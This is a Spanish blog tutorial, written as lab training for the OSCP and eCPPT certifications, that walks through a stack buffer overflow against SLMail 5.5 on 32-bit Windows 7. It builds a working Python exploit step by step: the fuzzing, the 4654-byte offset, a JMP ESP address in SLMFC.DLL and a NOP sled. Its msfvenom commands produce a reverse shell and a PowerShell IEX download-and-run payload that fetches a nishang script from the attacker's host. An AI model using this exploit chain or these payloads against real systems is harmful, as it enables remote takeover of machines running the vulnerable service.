---
title: Basic BoF Windows 32bits
date: 2023-09-20
categories: [Linux, Cajón que no cierra]
tags: [Buffer Overflow]
image:
  path: ../../assets/img/Linux/CajonNoCierra/basicBofWindows32/buffer.png
  width: 528
  height: 340
  alt: Banner BasicBofWindows
---

Mostraré como realizar un ataque buffer overflow (BoF) sin protecciones, el más básico pero es el que cae actualmente en certificaciones como el **eCPPT** y el **OSCP** así que de lujo. Nos preparan para esas certificaciones.  Veréis que la metodología de los dos BoF es igual.
Agradecimientos a s4vitar y a su academia.

## ¿Qué es un Buffer Overflow?

Es una vulnerabilidad producida cuando un programa intenta almacenar más datos en un búfer (zona de memoria temporal de almacenamiento de datos) de lo que está programado para almacenar, y al exceder la capacidad del búfer, los datos adicionales se escriben en otras zonas de memoria adyacentes. En esas zonas se pueden escribir códigos maliciosos y controlar el flujo del programa.

En lenguajes de programación como C o C++ suele ser crítico por la capacidad de manipulación de la memoria.

## Primer Buffer, ante una máquina Windows de 32 bits.

### Preparando el ataque en la máquina Windows

Como estamos ante un Windows lo trabajaremos desde un Windows, si no es complicado comprobar que funciona nuestra BoF.

Para instalar el Windows o en Keysfan por un modico precio, y ya lo tendrías para cuando quieras o s4vi lo hace buscando por "Windows 7 download 32 bits" y el de página uptodown.com con título Windows 7 Home Premium para Windows, descargar y obtendréis la ISO- Podéis ver la configuración completa en la Academia de s4vitar [hack4u](https://hack4u.io/) en curso Introducción al hacking y Buffer Overflow.

Para ello necesitaremos instalar en nuestro Windows el programa **Inmunity Debugger** -depurador de 32 bits para Windows-, te instalará el python en la propia instalación del Inmunity.  
Tendremos también que **deshabilitar el DEP** (Data Execution Prevention) -protección de Windows que nos impide ejecuar código en la pila-. Para ello abrir el cmd como administrador y escribir este comando:
```powershell
bcdedit.exe /set {current} nx AlwaysOff
```
Tendrías que ver "The operation complete sucesfully".

La última instalación que realizar sería **mona**, una extensión del Inmunity. En google buscamos por "mona github" y nos descargamos el de Corelan Repository --> Abrir el mona.py --> Raw (tardará en mostrarlo) --> Copiar todo y pegar a al escritorio, por ejemplo, como mona.py (se guardará como txt pero ahora lo cambiamos) --> Dentro del escritorio hacer Shift + Click Derecho y Open command window here, te abrirá la consola en esa ruta --> `move mona.py.txt mona.py` --> Movemos ese programa a C://Program Files/Inmunity Inc/Inmunity Debugger/PyCommands

Ahora si abrimos en Inmunity Debugger y ponemos abajo **!mona** tenemos una utilidad para facilitarnos el manejo de la memoria.

Deshabilitamos el firewall para no tener conflictos con los puertos después; Windows Firewall --> Turn Windows Firewall on or off --> Turn off en todas.

Reiniciamos para que la deshabilitación del DEP se efectúe.  
Realizaremos el BoF al programa SLMail 5.5 así que lo descargamos, nos vale con el de Free Trail --> Trusted Download (al a derecha) --> Ejecutamos  --> Todo Next --> Y reiniciamos equipo.
Este servicio abrirá el puerto 25 y el 110, el puerto 110 es el vulnerable. Si hacemos un searchsploit slmail 5.5 estaría el exploit.


### ¡Al ataque!

Como dije antes realizaremos el BoF al programa SLMail 5.5, instalado en una máquina windows 7 de 32 bits, en VMWare en mi caso, con ip 192.168.11.30, el puerto vulnerable de este servicio es el 110. Y esta sería nuestra máquina víctima con el programa en servicio.

Desde nuestra máquina atacante realizamos un escaneo de puertos para comprobarlo:
```sh
> nmap -p- --open -SS --min-rate 5000 -vvv -n -Pn 192.168.11.30
# Veríamos el 110
```
Podriamos conectarnos por telnet o por netcat al servicio:
```sh
> telnet 192.168.10.30 110
# Verás cabecera de respuesta, y te puedes autenticar de esta manera:
USER test
PASS test
# No te dejará porque no existe.
```

### Fuzzig. Tomando el registro EIP.

Con fuzzear en este apartado me refiero a meter datos hasta que el programa crashea en algún punto/input de usuario del programa.  

Desde el Windows con el Inmunity Debugger nos sincronizaremos al programa a analizar, para ello:  
File--> Attach --> Buscar el nombre del programa, en el caso SLMail --> Attach. Veremos 4 partes y estará pausado el programa (abajo derecha). --> Pulsamos play

Dejamos esto apartado de momento y vamos a fuzzear. Para fuzzear nos creamos un chulo script en python:
```py
#!/usr/bin/python3

import socket
import sys

# Variables globales
ip_address = "192.168.10.30"
port = 110
total_lenght = int(sys.argv[1])
# Para al menos pasar un argumento al programa, el primero es el nombre del script recuerda. Lenght porque fuzzearé por cantidad de bytes para en algún momente exceder el buffer.
# Antes de eso tienes que hacer un typecasting, cambio de tipo porque te lo tomará por una string:
# total_lenght = type(int(sys.argv[1])) , y ejecutas el exploit.py.
if len(sys.argv) != 2:
    print("\n[!] Uso: exploit.py <lenght> \n")
    exit(1)

def exploit():
    # Creando socket por TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectando al server
    s.connect(())

    # Recibiendo el banner, para comprobar que nos hemos conectado al servicio
    banner = s.recv(1024)

    # print(banner) para ver la respuesta y comprobar que todo marcha.

    # En formato bytes de ahí la b, y \r\n que es retorno de carro y espacio para representar el enter. Ya que al conectar al servicio te pide el User y después de escribirlo tienes que dar al enter.
    s.send(b"USER guise" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + b"A"*total_lenght + b'\r\n')
    s.close()

    # Si quisieras ver la respuesta hasta aquí añade;
    # response = s.recv(1024)
    # print(response)



if __name__ == '__main__':
    
    exploit()
```
Ahora lanzariamos el exploit desde nuestra máquina atacante con el Inmunity y el servicio abierto en el Windows claro. Cuando en el Inmunity pare, saldrá "pause" abajo derecha, es cuando habrá colapsado:
```sh
> python3 exploit.py 300
# No ha pasado nada, el Inmunity sigue en estado "running"

> python3 exploit.py 1000
# Sigue corriendo, pues probemos a meter más.

> python3 exploit.py 5000
# Se ha parado!
```
Bien se ha parado y el **EIP** (justo abajo explico un poco) apunta a 41414141 (realmente 0x41414141), que son cuatro letras "A". Has sobreescrito registros de la memoria, ya que el programador no espera recibir tantos bytes de entrada.

ESP = Pila o stack, extended stack pointer.  
EIP = Extended Instruction Pointer. Puntero de instrucción que apunta a la siguiente instrucción que el microprocesador debe ejecutar.

La pregunta es ¿Cuántas "A" tenemos que meter para sobrescribir el EIP?.

Para ello usaremos una herramienta que facilita metaexploit llamada **pattern_create.rb**, en la ruta /usr/share/metaexploit-framework/tools/exploit/pattern_create.rb. Te genera un número que tu le indiques de bytes aleatorios y luego con **pattern_offset** puedes localizar la posición exacta de cada uno y así localizar el **offset** -cantidad de bytes hasta llegar al EIP- también llamado junk(basura).
```sh
/usr/share/metaexploit-framework/tools/exploit/pattern_create.rb -l 5000
# Nos lo copiamos el resultado
```
El programa en el Windows estará pausado/corrompido, cierralo y vuelve abrir. Y lo mismo con el Inmunity, attach al SNMail --> play.

Ahora cambiar el exploit.py, añadimos el payload con la cadena generada con el pattern_create y quitamos el total lenght y el condicional del argumento, las líneas modificadas quedarían así en el script:
```py
payload = b'TEXTO COPIADO'

# Y más abajo modificamos:
s.send(b"PASS " + payload + b'\r\n')
```
Lanzamos el exploit.py
```sh
> python3 exploit.py
```
Se corrompera de nuevo el servicio. Se quedará en pause en el Inmunity.  
Nos copiamos el valor que sale en el EIP, imagina que es; 7A37417A
```sh
> /usr/share/metaexploit-framework/tools/exploit/pattern_offset.rb -q 0x7A37417A
# Saldrá un número, ese será el offset. 
```
El offset que salió es 4654, entonces 4654 "A" por ejemplo, habría que meter justo antes de llegar al EIP. Comprobemos que es verdad, modificamos el exploit.py:
```py
# Quitamos el churraco de payload(el texto copiado). Añadimos en variables globales:
offset = 4654
before_eip = b"A"*offset
eip = b"B"*4
payload = before_eip + eip

# El resto no cambia.
```
Ya sabes, cerramos el servicio y el Inmunity y volvemos a abrirlos (ya que el servicio se quedo crasheado de antes) y lo mismo --> attach y play en el Inmunity.

Lanzamos de nuevo el exploit.py, se pausara/crasheará de nuevo en el Inmunity el servicio y en el EIP deberíamos ver 42424242 correspondiente a las letras B en hexadecimal.

Tenemos el control del EIP. Completada la primera parte.

### Después de sobrescribir el EIP

Hemos calculado el offset -cantidad de caracteres antes de llegar al EIP- que en este caso son 4654 caracteres. El EIP lo hemos llenado de 4 caracteres. ¿Y ahora que?, ¿si añadimos más caracteres a donde van?. En esta ocasion veremos, en el Inmunity, que los caracteres adicionales se encontraran en el **ESP** -Extended Stack Pointer- que es un registro especial que **representa la dirección** de la **pila** en la memoria, por eso a veces se le pueda llamar pila al ESP.  
La pila es una estructura de datos en la memoria que se utiliza para almacenar información temporalmente, como valores de variable y direcciones de retorno de funciones.

En el script añadimos:
```py

after_eip = b"C"*200

payload = before_eip + eip + after_eip

```

Salimos de servicios y volvemos a entrar y lanzamos exploit.py. Abrimos el inmunity y veremos que el valor de EIP sigue siendo 42424242 correspondiente a las "B", y ahora en ESP(la pila) tenemos el valor 0251A128, al lado en el ASCII tienes un montón de "C". Si seleccionas el ESP, das click derecho y "follow in dump" verás abajo izquierda direcciones y representaciones. En esta parte vemos que nuestras "C" empiezan justo al principio del ESP, inmediatamente después del EIP.

Entonces podemos pensar que si en el EIP ponemos la dirección contenida en el ESP **0251A128** nos interpretara las "C". Tiene sentido pero no puedes -no puedes porque además esta puede cambiar cada vez que lanzas el programa-, tienes que poner la dirección del llamado **opcode**(explicado justo abajo) para que aplique una instrucción del tipo JUMP ESP y salte al ESP y como las "C" ya están de primeras te las interpretará, no pondremos "C" claro, añadiremos un shellcode malicioso.  
Opcode o código de operación es la porción de una instrucción de lenguaje de máquina que especifica la operación a ser realizada.

Importante decir que no vale cualquier shellcode ya que no todos los caracteres serán interpretados por el programa, algunos son considerados badchars -caracteres malos- que hacen que el programa se corrompa o no logre interpretar el shellcode. En el siguiente apartado descubriremos los **badchars** y los **bytearray** para descubrirlos, para averiguar que caracteres no gustan al programa a vulnerar. Cada programa tiene sus badchars. Y si, también faltaría meter el opcode, pero eso más tarde.

### Generando Bytearrays y detección de Badchars.

Dentro del Inmunity vamos a declarar nuestra zona de trabajo con Mona. Abajo:
`!mona config -set workingfolder C:\Users\Guille\Desktop\MonaWork1`
Te creará un directorio, no verás el directorio creado hasta que no crees algo dentro de él.  
`!mona bytearray`  
Veremos en pantalla todas las combinaciones posibles y te habrá guardado eso mismo en el directorio creado.

El null byte x00 suele dar problemas lo mejor sería quitarlo ya de primeras. Podríamos quiarlo o bien borrandolo del propio txt o despues el Inmunity:  
`!mona bytearray -cpb '\x00'`  

En el after_eip cambiaremos las "C" por el bytearray creado. S4vitar dice que se mete en el ESP, que se entiende, porque en el ESP está la dirección que apuntaría a ese bytearray. Cuando lancemos el eploit.py con ese bytearray los caracteres que no salgan representados en el Inmunity serán badchars.

Nos pasamos el bytearray con un recurso compartido por ejemplo a la máquina parrot (máquina atacante), en mi caso:
```sh
impacket-smbserver smbFolder $(pwd) -smb2support
```
Y desde el Windows desde el explorador de archivos poner \\MiIP\smbFolder, veremos la carpeta, pasamos el bytearray allí.   
Todo esto funciona si hemos configurado los sistemas virtuales tipo Bridge en las conexiones.

Modificamos el exploit.py:
```py
after_eip = (b"\x01\x02........."
b"\x21\x22....."
b"\x34\x35....")
# No lo pongo entero, pero así es la estructura, entre parentesis y en cada línea marcar que son bytes.
# El resto igual
```
Ya sabes cerramos todo y volvemos abrir, attach, play y lanzamos exploit.

Se habrá pausado/colpasado, pinchamos el ESP--> click derecho-->Follow in dump. Abajo izquierda veríamos el bytearray, justo donde no siga el órden ese carácter no lo gusta al programa. Por ejemplo si vemos `01 02 03 28 29` aquí el problema estaría con el 04, no se visualiza y corta el órden. Esto se hará uno a uno. Podemos ir descartando los badchars visualmente o con; `!mona compare -a 0x0251A128 -f C:\User\Guille\Desktop\MonaWork1\bytearray.bin`. El número es la dirección en el ESP, la que apunta a el bytearray, ompara eso con el archivo que tienes guardado, pero NO pongas el txt sino el .bin.

Con lo rerpesentado en badchars puedes ir quitando con `!mona bytearray -cpb '\x00\x0a'` Es recomendable, esto servirá para comparar la siguiente vez con !mona compare, ya que así se modifica el .bin. Para el exploit que tengo en el parrot lo quitamos a mano y ya está, más fácil.

Y vuelta lo mismo, cerramos todo, volvemos abrir, lanzamos exploit. Para cuando llegues al punto de quitar los badchars con mona se escriben todos ellos, es decir, si ahora sale de badchars 0d pondríamos `!mona bytearray -cpb '\x00\x0a\x0d'`. Quitamos manualmente el 0d de mi exploit.py y vuelta a empezar.

Cuando ejecutando el !mona compare ya no salgan badchars es que ya no hay. Los caracteres existenes no deberían dar problemas. Y podría generar un shellcode que me interese con los caracteres que sé ahora que puedo usar para generar instrucciones en la pila. Se puede hacer gracias a que el DEP(Data Execution Prevention) está deshabilitado, de estar habilitado no podríamos lanzar instrucciones en la pila.


### Buscando el opcode para saltar al ESP y cargar shellcode.

> En resumen; Con el offset llegamos al punto en el que el programa colapsa, en el EIP si es de 32 bits habrá 4 caracteres y su función es apuntar a la siguiente instrucción que se debe ejecutar pero antes de ocuparnos de esto averiguamos el ESP que contiene la dirección de la pila en la memoria. Recuerda que intentaremos ejecutar instrucciones en la pila. Descartamos los badchars contenidos en está pila (lo que en el exploit llamamos after_eip). Una vez averiguados los caracteres que podemos usar podemos crear un shellcode. Para que el programa apunte a ese shellcode(al ESP podemos decir), ahora si, entra la función real de EIP, para ello tenemos que buscar un opcode -porción de una instrucción de lenguaje de máquina que especifica la operación a ser realizada-, que realize un salto al ESP -JMP ESP-, ya que no vale con poner directamente la dirección contenida del ESP en el EIP.


Vamos a generar un shellcode, en este caso una instrucción a bajo nivel que nos lance una reverse shell. Esta instrucción se forma en hexadecimal y tendremos que excluir los badchars sacados antes. Imaginemos que esos badchars son; x00,x0a,x0d.  
Usaremos para crear el shellcode msfvenom, una herramienta de metaexploit pero sin usar metaexploit.
```sh
> msfvenom -l payloads
# Veremos todos los payloads disponibles.
# Los que llevan ruta meterpreter si que son usando metaexploit estando desde un listener -sesión de escucha-.

> msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=MIIP LPORT=MIPUERTO -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
# Hay que indicar el sistema operativo y la arquitectura que en este caso es de 32 bits. 
# LHOST y LPORT es el host y el puerto al que será mandada la reverse, es decir, al mio de atacante.
# -f de formato que será C.
# msfvenom usa encoders por detrás, el encoder que suele usar por defecto es el shikata_ga_nai.
# EXITFUNC=thread es para que cree un proceso hijo del servicio, ya que si consigues la reverse y luego sales de ella el servicio colpasará, de esta manera se crea un proceso hijo y al salir solo fallaría ese hijo.
```

Si hay muchos badchars puede que no funcione el shikata_na_nai. Quitalo en ese caso que el msfvenom ya se ocupará de crearte uno adecuado.

Copiamos el shellcode obtenido y añadimos en el exploit:
```py
# Quitamos el after_eip y en su lugar ponemos variable shellcode:
shellcode = (b"\x01\x02....."
b"\x0f\x0.....")  # Estructura con el shellcode obtenido del msfvenom.

payload = before_eip + eip + shellcode
```
Ya tenemos el shellcode que estará en la pila, peeero el EIP de momento no apunta a la pila. No puedo decir a EIP que apunte a la dirección que tiene ESP (se ve en el Inmunity), hay que buscar una dirección que aplique un salto al ESP. Para dar con ella desde el inmunity:
```sh
!mona modules
```
Hay que buscar un modulo que tenga las 4 primeras protecciones deshabilitadas, que las tenga en valor False. Quedate con el nombre final de la linea, digamos que es **SLMFC.DLL**, el modulo. Ahora buscaremos una instrucción JMP ESP dentro de esta dll. Para buscarlo no podemos poner JMP ESP sino el opcode en formato hexadecimal.
```sh
# Desde mi terminal:
> /sur/share/metaexploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP # Escribimos jmp ESP
# Saldrá FFE4, es un valor fijo, no depende del programa.
```
Saldría **FFE4** que es un valor fijo, no cambia según el programa(tiene toda la pinta al menos) y se representa de esta forma; **\xFF\xE4**. No hace falta dar la vuelta al opcode.

Ahora buscamos con mona ese opcode en el modulo elegido.
```sh
!mona find -s "\xFF\xE4" -m SLMFC.DLL
```
Si esta instrucción no funciona, no te encuentra nada, prueba con esta otra:
```sh
!mona findwild -s "JMP ESP"  # También se puede buscar como JMP ESP en el !mona find de arriba.
# Como ves no indicamos modulo.
```
Saldrán direcciones, hay que escoger una que no esten los badchars encontrados. Elegiremos la **0x5f4c4d13**.

En exploit.py modificamos:
```py
# Hay que poner la direción al  revés porque estamos en 32 bits y se realiza en formato little endian.
from struct import pack # Para que lo represente de forma automática en little endian
eip = pack("<L", 0x5f4c4d13)
```
Salimos y entramos del inmunity y del servicio, attach, le damos al play ¡¡¡¡peeeero ahora!!! pulsaremos la flecha azul para hacer un break point y metemos la dirección copiada antes;0x5f4c4d13 --> Ok.  
Arriba a la izquierda veremos que la dirección 5f4c4d13 contiene el JMP ESP.  
Click derecho --> Breakpoint --> toggle --> yes

Pues bien, ahora comprobaremos si al lanzar el exploit.py EIP vale 5f4c4d13
```py
> python3 exploit.py
```
Volvemos al inmunity, estamos en un break point, y si toda va bien veremos que EIP vale 5f4c4d13.  
Aquí se puede ver muy bien la lógica del programa de nuevo; EIP salta a la dirección 5f4d4c13 y esta dirección contiene la instrucción JMP ESP, es decir, hará un salto al ESP, ¿y que vale el ESP? vale **0272A128**. Pues este valor es lo que valdrá EIP si continuamos el programa (recuerda que estamos en un break point) hacemos un step into (botón al lado del pause).  
¡¡Y si!!!, EIP tiene el valor 027A128.  
Si hacemos un click derecho all EIP --> follow in dump, tendremos nuestro shellcode representado. El tema es que esto no te lo va a interpetar, hay que darle un espacio, todo el mundo necesita algo de espacio.

Ya casi lo tenemos, queda poco!.

### Uso de NOPs, desplazamientos en pila. Conseguimos la reverse shell.

Si lanzamos el exploit tal y como lo tenemos (sin el espacio) no lo interpeta ¿por qué?, al ser el shellcode amplio y algo complejo su ejecución puede llevar más tiempo de la que el procesador tiene disponible antes de que continue con la siguiente instrucción del programa.

Para solucionar esto hay dos formas:
1- Asignar un espacio gracias al cual el procesador tenga tiempo para interpretarlo. Y para ello, se suelen utilizar **NOPs** -"no op" no operation- en plan "no ganas nada", se representan como x90

2- Desplazamiento de la pila. Para que tarde más en llegar a la pila.

Vayamos con la primera forma. Modificamos el exploit.py:
```py
# Añadimos 16 NOPs, podemos meter más. A más mejor.
payload = before_eip + eip + b"\x90"*16 + shellcode
```
Ahora sí, lanzemos exploit con expectativa de conseguir la reverse. En nuestra terminal atacante:
```sh
> rlwrap nc -nlvp 443
```
```sh
> python3 exploit.py
```
¡¡¡¡¡¡¡ Y conseguimos la reverse shell.!!!!!

Para la segunda forma -Desplazamiento de la pila:
```sh
> /sur/share/metaexploit-framework/tools/exploit/nasm_shell.rb
nasm > sub esp,0x10  #10 en hexadecimal es 16 en decimal.
# Decrementa el puntero de la pila en 16 bites.
# Me copio la instrucción; 83EC10
```
Y modifico exploit:
```py
payload = before_eip + eip + b"\x83\xEC\x10" + shellcode
```
Hago lo mismo que antes; `rlwrap nc -nlvp 443` y `python3 exploit.py`.

Y consigo también la reverse shell.

**Si controlamos este tipo de buffer overflow ya tenemos la parte del BoF del OSCP y la del eCPPT bien preparada.**

### Extra; Modificando shellcode para controlar el comando a ejecutar.

```sh
> msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://MiIP/PS.ps1')" --platform windows -a x86 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
```
Te ejecturá esa instrucción, ese PS.ps1 es un recurso de nishang que usamos mucho para máquinas Windows. Nos da una consola interactiva.  
Github nishang --> Shells --> Invoke-PowerShellTcp.ps1  
Este script lo renombrare a Ps.ps1. Para que al llamar al programa te ejecute la reverse tienes que modificarlo. No copiamos el Example de la reverse y lo pegamos, con nuestra IP y nuestro puerto, al final del script. Te interpretará la acción cuando llegue al final y te mandará la reverse.

Añadimos ese nuevo shellcode generado por el msfvenom al exploit.py.
```sh
> python3 -m http.server 80
```
```sh
> rlwrap nc -nlvp 443
```
```sh
> python3 exploit.py
```
La **diferencia** entre la reverse de  este apartado "extra" y el anterior, es que aquí conseguimos una reverse shell con **powershell** (shell powershell) y antes conseguimos una msdos. Y la powershell es más potente.

En la siguiente clase de la academia de s4vitar "Explotando un nuevo binario para reforzar lo aprendido" se ve como teniendo los conceptos claros se hace rápido.  
Se podría decir que aquí se acaba el BoF, añado un tema para profundizar.

### ¿Cómo funcionan los shellcodes?.

Dependiendo del sistema operativo y la arquitectura que corre el servicio a explotar se ha de crear un shellcode u otro.

Analizaremos el siguiente shellcode para un linux de 32 bits.
```sh
> msfvenom -p linux/x86/exec CMD="echo 'Hola Gente'" -f elf -o binary
# Para linux se usa el formato elf
# Lo exportamos como binary
```
Recuerda dar permiso de ejecución al binario `chmod +x binary`. Si lo ejecutaras te saldría por supuesto 'Hola gente'.

Para ver lo que pasa en el programa a bajo nivel, a nivel ensamblador:
```sh
> msfvenom -p linux/x86/exec CMD="echo 'Hola gente'" -f raw | ndisasm -b32 -
# Veremos las instrucciones.
# Si tenemos pwntools podemos hacer lo siguiente para verlo con colores:
> msfvenom -p linux/x86/exec CMD="echo 'Hola gente'" -f raw | disasm
```
La función **int (0x80)** corresponde a una interrupción del sistema, pudiendo aprovechar para hacer llamadas al sistema.

Podemos rastrear lo que hace un programa con strace, permite rastrear las llamadas y señales del sistema Linux.
```sh
> strace ./binary
```
Algunas llamadas al sistema en C -System Calls in C- son; Create, Open, Close, Read, Write.  
Si queremos saber más sobre ellas escribimos comando `man 2 Read` por ejemplo.

Imagina que encontramos un write. Para hacer que en la interrupción aplique esta llamada tenemos que buscar el identificador de la llamada, esto se ve en /usr/include/asm/unistd_32.h.  El identificador de write es 4.  
Si quisiera entonces generar un shellcode para hacer lo de arriba - el Hola gente, que por debajo usa un write- tendría que hacer una interrupción donde carge un 4. Pero no en cualquier registro, no todos permiten hacer todas las llamadas del sistema.

Si queréis saber más apuntaros a la academia de s4vitar que merece la pena.



**Faltaría para una linux de 32 bits del mismo tipo, puedes ver la del simulacro de exámen eCPPT por ejemplo**.